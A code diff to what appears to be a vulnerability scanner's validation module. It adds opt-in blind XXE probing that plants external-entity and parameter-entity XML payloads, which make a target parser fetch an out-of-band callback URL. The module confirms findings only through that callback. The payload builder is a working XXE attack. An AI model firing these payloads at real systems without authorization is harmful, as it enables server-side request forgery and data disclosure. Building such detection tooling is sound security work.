@@ -8,15 +8,21 @@ match. Anything that merely *looks* suspicious but cannot be objectively
 confirmed here is returned as a manual-confirm lead (validated=False upstream),
 so recall stays honest and false positives do not get asserted as real.
 
-Fast (short per-request timeout), hang-proof, and offline: none of these oracles
-depend on an external collaborator/OOB server. SSRF confirmation is therefore
-limited to the *reflected* class (the fetched response is echoed back); a blind
-SSRF that only performs an out-of-band request is reported as a lead, not a
-validated finding — because we cannot prove it from in-band signals alone.
+Fast (short per-request timeout) and hang-proof. Most oracles here are fully
+offline (in-band signals only): reflected file content, a 3xx Location that
+resolves off-origin, a fetched-URL echo. The ONE exception is blind XXE
+(:func:`plant_blind_xxe`), which is opt-in: it only runs when the caller supplies
+an OAST correlation registry, mints a provenance-carrying callback token, and
+leaves confirmation to that registry's out-of-band reconcile — no in-band guess
+is ever asserted. This is what covers the real ginandjuice.shop shape: a parser
+that resolves external entities but reflects nothing in-band (numeric-validated
+fields, parameter entities refused), so the only proof is the out-of-band hit.
+A blind SSRF that only performs an out-of-band request is likewise reported as a
+lead unless an OAST callback confirms it.
 """
 from __future__ import annotations
 
-from typing import Any, Dict, List, Optional
+from typing import Any, Dict, List, Optional, Tuple
 from urllib.parse import parse_qsl, urlparse, urlencode, urlunparse
 
 import httpx
@@ -340,6 +346,93 @@ async def detect_xxe(
                 "confidence": 1.0,
             }
     return None
+
+
+def _blind_xxe_bodies(callback_url: str, root: str, field: str) -> List[Tuple[str, str]]:
+    """Build external-entity payloads that make the parser fetch ``callback_url``.
+
+    Returns (label, body) pairs covering the two parsers seen in the wild:
+      - ``system-entity``: a general external entity referenced in a data field.
+        Works when general entities resolve (the common case).
+      - ``param-entity``: the callback fetched from a *parameter* entity in the
+        DTD. Covers parsers that block general entities in content but still
+        expand parameter entities (a frequent half-measure).
+    Both are built against the app's OWN ``root``/``field`` so a schema-validating
+    endpoint still parses them."""
+    return [
+        (
+            "system-entity",
+            '<?xml version="1.0" encoding="UTF-8"?>'
+            f'<!DOCTYPE {root} [<!ENTITY xxe SYSTEM "{callback_url}">]>'
+            f"<{root}><{field}>&xxe;</{field}></{root}>",
+        ),
+        (
+            "param-entity",
+            '<?xml version="1.0" encoding="UTF-8"?>'
+            f'<!DOCTYPE {root} [<!ENTITY % xxe SYSTEM "{callback_url}"> %xxe;]>'
+            f"<{root}><{field}>1</{field}></{root}>",
+        ),
+    ]
+
+
+async def plant_blind_xxe(
+    client: httpx.AsyncClient,
+    url: str,
+    *,
+    oast_registry: Any,
+    engagement_id: str,
+    method: str = "POST",
+    sample_xml: Optional[str] = None,
+    source_agent_id: str = "injection_scan",
+) -> int:
+    """Plant blind-XXE probes whose ONLY confirmation is an out-of-band callback.
+
+    For the endpoint's own XML schema (derived from ``sample_xml`` when given,
+    plus the generic shape), mint one provenance-carrying OAST token per payload
+    and POST an external-entity document that makes the parser fetch the token's
+    callback URL. This asserts NOTHING in-band — a finding is promoted only when
+    :meth:`OASTCorrelationRegistry.reconcile` later captures the callback. That is
+    the honest way to cover a parser that resolves entities but reflects nothing
+    (the ginandjuice.shop stock-check shape).
+
+    Returns the number of probes planted (payloads sent), for observability. The
+    caller is responsible for calling ``reconcile()`` to collect confirmations.
+    """
+    if oast_registry is None:
+        return 0
+    schemas = _xxe_schemas_from_sample(sample_xml) + [("osop", "data")]
+    planted = 0
+    for root, field in schemas:
+        for label, _tmpl in _blind_xxe_bodies("PLACEHOLDER", root, field):
+            try:
+                probe = await oast_registry.mint_probe(
+                    engagement_id=engagement_id,
+                    vuln_class="xxe",
+                    injection_point=f"xml-body <{root}><{field}>",
+                    payload=f"blind-xxe {label}",
+                    request_summary=f"{method} {url}",
+                    source_agent_id=source_agent_id,
+                    label=f"xxe:{label}:{root}",
+                )
+            except Exception:
+                continue
+            if not probe.callback_url:
+                continue
+            # Rebuild the body with the real callback URL now that we have it.
+            body = next(
+                b for lb, b in _blind_xxe_bodies(probe.callback_url, root, field)
+                if lb == label
+            )
+            try:
+                await client.request(
+                    method, url, content=body,
+                    headers={"Content-Type": "application/xml",
+                             "Accept": "application/xml, */*"},
+                )
+                planted += 1
+            except Exception:
+                continue
+    return planted
 
 
 if __name__ == "__main__":
